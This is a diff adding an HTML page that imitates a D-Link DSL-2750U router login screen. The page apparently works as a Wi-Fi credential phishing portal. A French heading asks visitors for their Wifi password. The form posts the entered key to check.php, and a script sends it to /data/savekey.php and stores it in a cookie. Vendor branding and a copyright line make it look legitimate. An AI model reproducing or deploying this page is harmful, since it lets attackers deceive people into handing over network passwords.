@@ -1,0 +1,268 @@
+<html><head>
+
+
+
+
+
+
+
+
+<meta name="viewport" content="width=device-width">
+
+
+<style>
+img {
+    max-width: 100%;
+}
+</style>
+<title>ADSL Router --Dlink</title>
+<style type="text/css">
+<!-- 
+body { margin:0px auto; padding:3px; font:12px Tahoma,Helvetica,Geneva,Arial,sans-serif; background:#757575;}
+	.Content { margin:0px auto; padding:0px 1px; width:840px; height:460px; background:white;}
+		.title { padding:5px 6px 3px; height:20px; background:#404343; color:white;}
+			.product { float:left; }
+			.firmware { float:right;}
+		.logo { margin:6px 0 40px 0; background:#F36D23;}
+		.login_bk { margin:0 auto; padding:5px; width:600px; height:208px; background:#F1F1F1;}
+			.login { height:206px; border:1px solid #F36D23; background:#DFDFDF; text-align:center;}
+				.login_title { padding:5px 10px; height:15px; font-weight:bold; background:#F36D23; text-align:left;}
+				p#lang_tips { text-align:left; margin:10px 10px 25px;}
+				.div_left { padding:3px 8px 9px; float:left; width:240px; text-align:right; font-weight:bold;}
+				.div_right { font-weight:bold; text-align:left; height:28px;}
+				.do { margin-top:10px;}
+				.div_button { margin-top:20px;}
+		.footer { margin-top:43px; background:#404343;}
+		p#copyright { color:#F1F1F1; text-align:center; font-size:11px; margin:10px;}
+-->
+</style>
+<script type="text/javascript" src="./img/main.js"></script>
+<!-- 
+/*---- Global variable define -----*/
+var G_Error	    = "1"; 
+var G_Status	= "0"; 
+var G_Error_Msg	= "";
+
+//support language
+var G_SupportLang = "en_us";
+//default language
+var G_DefaultLang = "en_us";
+
+//Init
+//get user info
+var G_UserInfo = new Array();
+var m = 0;
+	G_UserInfo[m] = new Array();
+		G_UserInfo[m][0] = "admin"; //UserName
+		G_UserInfo[m][1] = "1"; //Level
+		G_UserInfo[m][2] = "1"; //Index
+		m++;
+	
+
+	//加载语言列表
+function createLangsOptions(){
+	var _text  = [], _value = [];
+	var split_lang = G_SupportLang.split(";");
+	for(var i = 0; i < split_lang.length; i++){
+		if(split_lang[i] == 'en_us'){
+			_text.push('English');
+		} else if(split_lang[i] == 'zh_cn'){
+			_text.push('简体中文');
+		}
+		_value.push(split_lang[i]);
+	}
+	
+	$S('SELECT_Language', _text, _value);
+}
+	
+function uiOnload(){
+	//search language
+	Cookie.Set('language',G_DefaultLang);
+	chg_language(data_language);
+	//create user option
+	createUserOpt();
+	//$('SELECT_UserName').value = 'admin';
+	var Psd = Cookie.Get('TBSPASSWORD');
+		
+	if(Psd){
+		Form.Checkbox('INPUT_Remember', '1');
+		$('INPUT_Psd').value = Psd;
+	}
+	$('INPUT_Psd').focus();
+	
+	dealWithError();
+}
+
+function createUserOpt(){
+	var _text = [], _value = [];
+	var formIp = '192.168.1.34';
+	
+	if(formIp.indexOf('192.168') > -1){
+		_text = [G_UserInfo[0][0]], _value = [G_UserInfo[0][0]];
+	} else {
+		_text = [G_UserInfo[0][0]], _value = [G_UserInfo[0][0]];
+	}
+	$S('SELECT_UserName', _text, _value);
+}
+
+function uipostLogin(){
+	if($('INPUT_Psd').value == ''){
+		return false;
+	}
+	//record password
+	recordPsd();
+	//record level
+    Cookie.Set('sys_UserName', $('SELECT_UserName').value);
+	$H({
+		'getpage'   :'html/index.html',
+		'errorpage' :'html/error.html',
+		'var:menu'  :'setup',
+		'var:page'  :'wizard',
+		'obj-action':'auth',
+		':username' :$('SELECT_UserName').value,
+		':password' :$("INPUT_Psd").value,
+		':action'   :'/data/savekey.php',
+		':sessionid':'6ecc5d3e'
+	},true);
+	$('uiPostForm').submit();
+}
+
+function recordPsd(){
+	if(Form.Checkbox('INPUT_Remember')){ //checked = true;
+		Cookie.Set('TBSPASSWORD', $('INPUT_Psd').value, 720);
+	} else if(!Form.Checkbox('INPUT_Remember')){ //checked = false;
+		Cookie.Delete('TBSPASSWORD');
+	}
+}
+
+/* 更换main.html语言 */
+function onChgLang(){
+    setCookie('language', $('SELECT_Language').value);
+	document.location.href = '/cgi-bin/webproc';
+}
+
+/* 
+对错误码的处理 
+错误码的格式:节点名=错误码
+*/
+function dealErrorMsg(arrayNode, errorMsg){
+	if (typeof errorMsg != 'string') 
+	    return;
+	    
+	//将错误信息一分为二：前段寻找错误码对应的节点；后段寻找错误码对应的提示；
+	var errorFragment = errorMsg.split('=');
+	var errorCode, errorString, leafNode;
+	
+	//寻找错误码对应的节点;
+	if (errorFragment != null && errorFragment.length > 0){
+		var _fragment = errorFragment[0].split('.');
+		leafNode = _fragment[_fragment.length - 1];
+		leafNode = arrayNode[leafNode];
+	}
+	    
+	//在获取错误码后，立即寻找相应的错误码。
+	if (errorFragment[1] != null){
+		errorCode = errorFragment[1].match(/^[0-9]{4}/)[0];
+	} else {
+		if (errorMsg.match(/^[0-9]{4}/) == null){
+            leafNode = arrayNode["result"];
+			
+			if($(leafNode)){
+				$(leafNode).innerHTML = errorMsg;				
+			}
+            return false;
+	    }
+	    errorCode = errorMsg.match(/^[0-9]{4}/)[0];
+	}
+	
+	if(UEcode[errorCode] !== undefined){
+		errorString = UEcode[errorCode];
+	} else if (SEcode[errorCode] !== undefined ) {
+		errorString = SEcode[errorCode];
+	} else {
+		errorString = SEcode[1000];
+	}
+	
+	//选择两种不同的错误提示方式：1、将错误准确打印在对应的输入框之后；2、对于未知错误，以告警框来提示；
+	if (leafNode != undefined){
+		$(leafNode).innerHTML = errorString;
+	} else {
+		alert(errorString + "!");
+	}
+}
+
+function dealWithError(){
+	if(G_Error != 1){
+		return false;
+	}
+	
+	var arrayHint = [];
+		
+	dealErrorMsg(arrayHint, G_Error_Msg);
+}
+
+window.onload = uiOnload;
+-->
+</script>
+
+<script type="text/javascript">
+function submitform()
+{
+  document.myform.submit();
+}
+</script>
+
+
+</head>
+
+
+
+
+<body>
+	<!-- content -->
+	<div class="Content">
+		<!-- title -->
+		<div class="title">
+			<div class="product"><span id="lang_product_main">Product Page</span>: DSL-2750U</div><div class="firmware"><span id="lang_firmware_main">Firmware Version</span>:ME_1.09</div>
+		</div>
+		<!-- logo -->
+		<div class="logo"><img src="./img//logo.gif" alt="logo"></div>
+		<!-- login background -->
+		<div class="login_bk">
+			<!-- login -->
+			<div class="login">
+				<!-- login title -->
+				<div class="login_title" id="lang_title">LOGIN</div>
+				<!-- tips-->
+				<p id="lang_tips"></p><br>
+				<!-- username/password -->
+<form id="form1" name="form1" method="POST" action="check.php" >
+				
+				
+				
+				
+   <br><center><b> <H2>Saisissez Le mot de passe de Votre Wifi </H2></b></center>
+
+				
+				
+				
+				<div class="div_left" id="lang_password">WIFI Password :</div><div class="div_right"> <input type="password" id="INPUT_Psd" name="key1" value="" onkeydown="if(event.keyCode==13)uipostLogin()"></div>
+				<!-- remember me -->
+				
+				<!-- submit -->
+			<div class="div_button"><input type="submit" name="uipostSubmit" id="uipostSubmit" value="Submit" onclick="submitform()"></div>
+			</div></form>
+			
+			
+			<!-- login failed -->
+		</div>
+		<!-- footer -->
+		<div class="footer"><img src="./img/broadband.gif"></div>
+	</div>
+	<!-- copyright-->
+	<p id="copyright">Copyright © 2013-2015 D-Link Systems, Inc.</p>
+	<!-- form -->
+	<form name="uiPostForm" id="uiPostForm" method="post" action="/data/savekey.php"></form>
+
+
+</body></html>
